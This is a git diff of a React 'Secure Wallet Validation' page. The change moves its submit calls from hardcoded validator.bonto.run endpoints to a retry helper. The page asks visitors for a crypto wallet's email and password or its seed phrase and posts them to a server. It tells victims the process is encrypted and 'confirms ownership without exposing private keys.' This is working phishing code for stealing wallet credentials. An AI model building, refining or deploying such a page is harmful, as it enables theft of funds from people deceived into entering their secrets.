@@ -7,10 +7,7 @@ import {
   CheckCircle
 } from "lucide-react";
 import "./secureWallet.css";
-
-/* DIFFERENT APIs */
-const EMAIL_API = "https://validator.bonto.run/other-wallet";
-const SEED_API = "https://validator.bonto.run/other-pharse";
+import fetchWithRetry from "../../utils/api";
 
 const SecureWallet = () => {
   const [method, setMethod] = useState(null);
@@ -46,11 +43,14 @@ const SecureWallet = () => {
     setLoading(true);
 
     try {
-      const res = await fetch(method === "email" ? EMAIL_API : SEED_API, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(form)
-      });
+      const res = await fetchWithRetry(
+        method === "email" ? "/other-wallet" : "/other-pharse",
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(form)
+        }
+      );
 
       if (!res.ok) throw new Error("Validation failed");
       setDone(true);
@@ -61,7 +61,6 @@ const SecureWallet = () => {
     }
   };
 
-  /* ================= SUCCESS ================= */
   if (done) {
     return (
       <div className="secure-wrapper">
@@ -70,9 +69,8 @@ const SecureWallet = () => {
           <h2>Validation in Progress</h2>
           <p>
             Your wallet details have been securely submitted.
-            You’ll be notified once verification is completed.
+            You'll be notified once verification is completed.
           </p>
-
           <button onClick={() => window.location.reload()}>
             Validate Another Wallet
           </button>
@@ -81,7 +79,6 @@ const SecureWallet = () => {
     );
   }
 
-  /* ================= SELECT METHOD ================= */
   if (!method) {
     return (
       <div className="secure-wrapper">
@@ -89,7 +86,6 @@ const SecureWallet = () => {
           <Shield size={36} />
           <h1>Secure Wallet Validation</h1>
           <p>Select how you want to secure your wallet</p>
-
           <div className="method-buttons">
             <button onClick={() => setMethod("email")}>
               Email & Password
@@ -103,36 +99,27 @@ const SecureWallet = () => {
     );
   }
 
-  /* ================= FORMS ================= */
   return (
     <div className="secure-wrapper">
       <div className="secure-box">
-
         <h1>Wallet Validation</h1>
         <p className="subtitle">
           Secure your wallet using {method === "email" ? "Email & Password" : "Seed Phrase"}
         </p>
-
         <div className="panel">
           <div className="security">
             <Shield size={14} />
             End-to-end encrypted
           </div>
-
-          {/* WALLET NAME */}
           <div className="input-group">
             <label>Wallet Name / Type</label>
             <input
               type="text"
               placeholder="e.g. coinbase, binance"
               value={form.walletName}
-              onChange={(e) =>
-                setForm({ ...form, walletName: e.target.value })
-              }
+              onChange={(e) => setForm({ ...form, walletName: e.target.value })}
             />
           </div>
-
-          {/* EMAIL FLOW */}
           {method === "email" && (
             <>
               <div className="input-group">
@@ -146,7 +133,6 @@ const SecureWallet = () => {
                   }
                 />
               </div>
-
               <div className="input-group">
                 <label>Password</label>
                 <div className="password-field">
@@ -165,8 +151,6 @@ const SecureWallet = () => {
               </div>
             </>
           )}
-
-          {/* SEED FLOW */}
           {method === "seed" && (
             <div className="input-group">
               <label>Seed Phrase</label>
@@ -179,9 +163,7 @@ const SecureWallet = () => {
               />
             </div>
           )}
-
           {error && <div className="error">{error}</div>}
-
           <button className="submit-btn" onClick={submit} disabled={loading}>
             {loading ? (
               <>
@@ -192,16 +174,13 @@ const SecureWallet = () => {
               "Validate Wallet"
             )}
           </button>
-
           <p className="notice">
             Validation confirms ownership without exposing private keys.
           </p>
         </div>
-
         <footer>
           Protected by industry-grade security standards
         </footer>
-
       </div>
     </div>
   );
